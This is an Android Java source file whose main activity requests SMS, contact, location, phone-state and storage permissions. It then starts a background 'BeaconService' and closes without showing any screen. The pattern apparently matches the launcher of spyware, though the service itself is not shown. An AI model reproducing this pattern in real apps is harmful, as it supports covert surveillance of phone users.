package com.kaku.svc;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.core.app.ActivityCompat;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        requestPerms();
        Intent svc = new Intent(this, BeaconService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
        finish();
    }

    private void requestPerms() {
        String[] perms = {
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.POST_NOTIFICATIONS
        };
        ActivityCompat.requestPermissions(this, perms, 1);
    }
}
